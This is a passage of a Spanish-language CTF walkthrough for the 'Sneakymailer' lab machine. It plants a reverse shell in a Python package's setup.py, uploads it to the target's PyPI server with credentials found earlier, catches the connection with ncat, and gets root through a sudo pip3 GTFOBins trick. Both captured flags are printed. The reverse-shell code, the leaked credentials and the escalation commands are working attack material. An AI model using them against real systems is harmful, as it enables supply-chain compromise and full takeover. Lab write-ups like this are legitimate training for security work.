Entonces procederemos a crear una estructura similar en nuestra maquina en este caso pondre de nombre a los directorios como `package`


```bash
❯ ls
 package   setup.cfg   setup.py
❯ tree
.
├── package
│   ├── __init__.py
│   └── package
├── setup.cfg
└── setup.py

2 directories, 3 files
```

Lo siguiente sera editar el `setup.py`, donde ademas añadiremos un codigo para ejecutarnos una `reverse shell` que se ejecutara cuando se inicie el `setup.py`

```python
from setuptools import setup

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.16.2",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

setup(
    name='linode_example',
    #packages=['linode_example'],
    description='Hello world enterprise edition',
    version='0.1',
    url='http://github.com/example/linode_example',
    author='Linode',
    author_email='docs@linode.com',
    keywords=['pip','linode','example']
    )
```

Comentar o borrar la linea de `packages=['linode_example']` ya que suele dar problema.


Ahora lo que tenemos que hacer es que el servidor de la maquina victima al momento de instalar el paquete me ejecute la `reverse shell` y eso lo hariamos creando un archivo `.pypirc` donde definamos cual es el repositorio al cual te quieras conectar y las credenciales de autenticación que de antes la tenemos.


```bash
❯ /bin/cat ~/.pypirc
[distutils]
index-servers = sneakypwned
[sneakypwned]
repository: http://pypi.sneakycorp.htb:8080/
username: pypi
password: soufianeelhaoui
```

Por ultimo sera ejecutar el siguiente comando para tratar de cargar el paquete en la maquina victima `python3 setup.py sdist upload -r linode`

Donde reeemplazaremos `linode` por el nombre que pusimos el el `index-servers` en el `.pypirc` que en nuestro caso es sneakypwned 

```python3
python3 setup.py sdist upload -r sneakypwned
```

Ejecutamos el `setup.py` y nos ponemos en escucha con `ncat`


```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.16.2.
Ncat: Connection from 10.10.16.2:46076.
# whoami
root
# pwd
/home/fmiracle/Machines/Sneakymailer/content/create
#
```

Pero vemos que nos hace una conexión a nuestra propia maquina, esto es por que primero se ejecuta la conexión locamente

Lo que debemos hacer es volver a ponernos en escucha con `ncat` y salir de nuestra conexión local con un `exit` esto hara que se ejecute la conexión esta vez de la maquina victima.


```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.16.2.
Ncat: Connection from 10.10.16.2:37168.
# whoami
root
# pwd
/home/fmiracle/Machines/Sneakymailer/content/create
# exit
running sdist
running egg_info
writing linode_example.egg-info/PKG-INFO
writing dependency_links to linode_example.egg-info/dependency_links.txt
writing top-level names to linode_example.egg-info/top_level.txt
reading manifest file 'linode_example.egg-info/SOURCES.txt'
writing manifest file 'linode_example.egg-info/SOURCES.txt'
warning: sdist: standard file not found: should have one of README, README.rst, README.txt, README.md

running check
creating linode_example-0.1
creating linode_example-0.1/linode_example.egg-info
creating linode_example-0.1/package
copying files to linode_example-0.1...
copying setup.cfg -> linode_example-0.1
copying setup.py -> linode_example-0.1
copying linode_example.egg-info/PKG-INFO -> linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/SOURCES.txt -> linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/dependency_links.txt -> linode_example-0.1/linode_example.egg-info
copying linode_example.egg-info/top_level.txt -> linode_example-0.1/linode_example.egg-info
copying package/__init__.py -> linode_example-0.1/package
Writing linode_example-0.1/setup.cfg
Creating tar archive
removing 'linode_example-0.1' (and everything under it)
running upload
Submitting dist/linode_example-0.1.tar.gz to http://pypi.sneakycorp.htb:8080/
Server response (200): OK
```

Recibimos la conexión desde la maquina victima como el usuario `low`

```bash
❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.197.
Ncat: Connection from 10.10.10.197:45570.
$ whoami
low
$ hostname -I
10.10.10.197 dead:beef::250:56ff:feb9:6b16 
```

Realizamos nuevamente un tratamiento de la `tty` como ya hicimos anteriormente, nos dirigimos al directorio personal del usuario y podemos visualizar la primera flag `user.txt`

```bash
low@sneakymailer:/$ cd /home
low@sneakymailer:/home$ ls
low  vmail
low@sneakymailer:/home$ cd low/
low@sneakymailer:~$ cat user.txt 
4a39c61b14f3e1c7c83014390f90942e
low@sneakymailer:~$ 
```

## Escalada de privilegios [#](#escalada-de-privilegios) {#escalada-de-privilegios}

Ejecutamos el comando `sudo -l` para ver si tenemos privilegios a nivel de `sudoers` y vemos que tenemos uno asociado al comando `pip3` el cual podemos ejecutar como `root` de forma temporal sin requerir contraseña.

```bash
low@sneakymailer:~$ sudo -l
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Matching Defaults entries for low on sneakymailer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User low may run the following commands on sneakymailer:
    (root) NOPASSWD: /usr/bin/pip3
```

Lo siguiente sera dirigirnos a nuestra web de confianza

* [https://gtfobins.github.io/](https://gtfobins.github.io/)

ahi podemos ver que si tenemos el privilegio de sudo en `pip3`, debemos ejecutar los siguentes comandos y nos convertiremos en el usuario `root`


```bash
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo pip install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
[sudo] password for low: 
low@sneakymailer:~$ TF=$(mktemp -d)
low@sneakymailer:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
low@sneakymailer:~$ sudo pip3 install $TF
sudo: unable to resolve host sneakymailer: Temporary failure in name resolution
Processing /tmp/tmp.25RDYk7IwK
# whoami
root
```

Finalmente podemos dirigirnos al directorio de `root` y visualizar la segunda flag `root.txt` :)

```bash
# cd /root
# cat root.txt
25ae2132a2ff299928b234e186ad53ec
```

